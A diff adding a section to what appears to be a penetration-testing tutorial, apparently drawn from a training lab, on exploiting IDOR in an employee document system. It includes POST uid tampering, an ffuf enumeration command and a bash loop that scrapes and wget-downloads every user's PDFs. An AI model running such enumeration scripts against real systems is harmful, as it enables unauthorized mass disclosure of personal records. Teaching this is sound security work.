@@ -13,6 +13,7 @@ This document covers common techniques for identifying and exploiting **web vuln
         - [Bypassing Security Filters](#bypassing-security-filters)
     - [Insecure Direct Object References (IDOR)](#insecure-direct-object-references-idor)
         - [Identifying IDORs](#identifying-idors)
+        - [IDOR Enumeration](#idor-enumeration)
 
 ---
 
@@ -348,5 +349,82 @@ For example, one user may trigger the following API response:
 ```
 
 Another user may not have direct access to this API endpoint. However, by replicating the request and modifying the object reference, an attacker can test whether the application properly enforces access control or discloses sensitive data.
+
+---
+
+### IDOR Enumeration
+
+Once an IDOR vulnerability has been identified, the next step is to **systematically enumerate accessible objects** using basic exploitation techniques.
+
+The target application is an employee management system used to host employee records. For simplicity, we assume we are authenticated as a user with `uid=1`. In a real-world scenario, this would require valid login credentials.
+
+![Filtered output](images/idor.png)
+
+When navigating to the `Documents` section, we are redirected to:
+
+```
+http://94.237.57.211:47065/documents.php
+```
+
+![Filtered output](images/idor2.png)
+
+On the `Documents` page, several files belonging to our user are listed:
+
+```
+http://94.237.57.211:47065/documents/Report_1_10_2021.pdf
+http://94.237.57.211:47065/documents/Invoice_1_09_2021.pdf
+```
+
+The filenames follow a predictable naming convention and are directly exposed in the URL, making them **direct object references**. The naming pattern includes the user ID (`uid`), as well as the month and year. This represents the most basic form of IDOR, often referred to as a **static file IDOR**.
+
+Inspecting the request reveals that the application sets the user identifier via a `POST` parameter:
+
+```
+POST /documents.php
+uid=1
+```
+
+![Filtered output](images/idor4.PNG)
+
+By simply modifying the `uid` value, we are able to access documents belonging to another employee:
+
+```
+POST /documents.php
+uid=2
+```
+
+![Filtered output](images/idor5.PNG)
+
+```
+http://94.237.57.211:47065/documents/Report_2_10_2021.pdf
+http://94.237.57.211:47065/documents/Invoice_2_09_2021.pdf
+```
+This confirms the presence of an IDOR vulnerability caused by **missing server-side authorization checks**.
+
+Enumeration of accessible user IDs can be easily automated using `ffuf`:
+
+```bash
+seq 1 10 > ids.txt
+```
+
+```bash
+ffuf -w ids.txt:FUZZ -u http://94.237.57.211:47065/documents.php?uid=FUZZ
+```
+
+A more effective approach is to automate both enumeration and file retrieval using a simple `Bash` script:
+
+```bash
+#!/bin/bash
+
+url="http://94.237.57.211:47065"
+
+for i in {1..10}; do
+        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
+                wget -q $url/$link
+        done
+done
+```
+
+When executed, this script iterates through user IDs 1–10, extracts document links, and downloads all available files. This results in **mass disclosure of sensitive employee documents**, fully exploiting the IDOR vulnerability.
 
 ---
